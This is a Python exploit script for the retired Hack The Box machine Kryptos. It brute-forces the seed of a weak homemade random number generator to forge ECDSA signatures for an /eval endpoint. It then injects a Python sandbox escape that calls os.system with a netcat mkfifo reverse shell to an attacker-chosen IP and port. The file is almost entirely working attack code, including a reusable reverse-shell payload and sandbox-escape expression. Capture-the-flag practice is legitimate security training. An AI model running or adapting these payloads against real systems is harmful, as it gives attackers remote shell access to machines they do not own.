#!/usr/bin/python
import random 
import json
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp
import requests
import sys

'''
Write-up: https://0xrick.github.io/hack-the-box/kryptos/
Description: Script for Hack The Box retired machine kryptos, final root exploit. 
'''

YELLOW = "\033[93m"
GREEN = "\033[32m"

def secure_rng(seed): 
    p = 2147483647
    g = 2255412
    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

def sign(sk,msg):
    return binascii.hexlify(sk.sign(msg))

def brute():
    num = 1
    for i in range(10000):
        expr = "1+1"
        seed = random.getrandbits(128) 
        rand = secure_rng(seed) + 1 
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) 
        vk = sk.get_verifying_key() 
        sig = sign(sk,expr)
        req = requests.post('http://127.0.0.1:81/eval', json={'expr': expr, 'sig': sig})
        response = req.text
        if response == "Bad signature":
            print YELLOW + "[-] Attempt " + str(num) + ": failed"
            num += 1
        else:
            print GREEN + "[+] Found the seed: " + str(seed)
            return seed
            break

def exploit(seed,expr):
    rand = secure_rng(seed) + 1 
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p) 
    vk = sk.get_verifying_key() 
    sig = sign(sk,expr)
    requests.post('http://127.0.0.1:81/eval', json={'expr': expr, 'sig': sig})

if len(sys.argv) != 4:
    print YELLOW + "[-] Usage: {} <seed> <ip> <port> | Or to bruteforce the seed: {} -b <ip> <port>".format(sys.argv[0],sys.argv[0])
    exit()
else:
    if sys.argv[1] == "-b":
        ip = sys.argv[2]
        port = sys.argv[3]
        print YELLOW + "[*] Bruteforcing the seed."
        seed = brute()
        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + str(port) + " >/tmp/f"
        expr = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \'Pattern\'][0].__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').system(\'" + payload + "\')"
        print YELLOW + "[*] Executing payload, check your listener."
        exploit(seed,expr)
    else:
        seed = int(sys.argv[1])
        ip = sys.argv[2]
        port = sys.argv[3]
        print YELLOW + "[*] Seed: " + str(seed)
        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + str(port) + " >/tmp/f"
        expr = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \'Pattern\'][0].__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').system(\'" + payload + "\')"
        print YELLOW + "[*] Executing payload, check your listener."
        exploit(seed,expr)
